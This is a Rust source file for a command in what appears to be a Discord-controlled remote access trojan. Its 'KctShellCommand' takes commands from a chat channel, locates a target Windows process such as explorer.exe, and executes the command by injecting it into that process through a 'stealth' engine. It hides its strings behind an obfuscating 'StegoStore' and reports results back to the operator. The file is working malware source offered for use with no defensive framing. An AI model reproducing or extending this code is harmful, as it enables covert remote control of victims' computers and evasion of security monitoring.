use crate::commands::*;
use twilight_model::channel::message::Message;
use std::sync::Arc;
use crate::core::http_client::HttpClient;
use anyhow::Result;
use async_trait::async_trait;
use crate::core::stego_store::{StegoStore, StringCategory};
use std::boxed::Box;

pub struct KctShellCommand;

#[async_trait]
impl BotCommand for KctShellCommand {
    fn name(&self) -> &str { Box::leak(StegoStore::get(StringCategory::CmdMeta, "KCTSHELL_NAME").into_boxed_str()) }
    fn description(&self) -> &str { Box::leak(StegoStore::get(StringCategory::Desc, "KCTSHELL").into_boxed_str()) }
    fn category(&self) -> &str { "core" }
    fn usage(&self) -> &str { Box::leak(StegoStore::get(StringCategory::CmdMeta, "KCTSHELL_USAGE").into_boxed_str()) }
    fn examples(&self) -> &'static [&'static str] { &[] }
    fn aliases(&self) -> &'static [&'static str] { 
        Box::leak(vec![
            Box::leak(StegoStore::get(StringCategory::CmdMeta, "KCTSHELL_ALIAS1").into_boxed_str()) as &str,
            Box::leak(StegoStore::get(StringCategory::CmdMeta, "KCTSHELL_ALIAS2").into_boxed_str()) as &str,
        ].into_boxed_slice())
    }

    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, args: Arguments) -> Result<()> {
        let cmd = args.rest();
        if cmd.is_empty() {
             http.create_message(msg.channel_id.get(), &StegoStore::get(StringCategory::Msg, "MSG_KCT_PROVID")).await?;
             return Ok(());
        }

        let mut target_proc = "explorer.exe";
        let mut actual_cmd = cmd.to_string();

        let parts: Vec<&str> = cmd.splitn(2, ' ').collect();
        if parts.len() == 2 && parts[0].to_lowercase().ends_with(".exe") {
            target_proc = parts[0];
            actual_cmd = parts[1].to_string();
        }

        let msg_injecting = StegoStore::get(StringCategory::Msg, "MSG_KCT_INJECTING").replace("{}", &actual_cmd);
        http.create_message(msg.channel_id.get(), &msg_injecting).await?;

        // Find Target PID
        let mut pid = 0;
        let mut manager = crate::core::process::ProcessManager::new();
        for process in manager.find_processes_by_name(target_proc) {
            if process.name.to_lowercase() == target_proc.to_lowercase() {
                pid = process.pid;
                break;
            }
        }

        if pid == 0 {
            http.create_message(msg.channel_id.get(), &StegoStore::get(StringCategory::Msg, "MSG_KCT_NO_PID")).await?;
            return Ok(());
        }

        // Execute via KCT Inject
        if let Some(engine) = crate::stealth::get_engine() {
            unsafe {
                match engine.kct_inject(pid, 2, &actual_cmd) {
                    Ok(_) => {
                        http.create_message(msg.channel_id.get(), &StegoStore::get(StringCategory::Msg, "MSG_KCT_SUCCESS")).await?;
                    }
                    Err(e) => {
                         let msg_fail = StegoStore::get(StringCategory::Msg, "MSG_KCT_FAIL").replace("{}", &format!("{:?}", e));
                         http.create_message(msg.channel_id.get(), &msg_fail).await?;
                    }
                }
            }
        } else {
             http.create_message(msg.channel_id.get(), &StegoStore::get(StringCategory::Msg, "MSG_KCT_NO_ENGINE")).await?;
        }

        Ok(())
    }
}
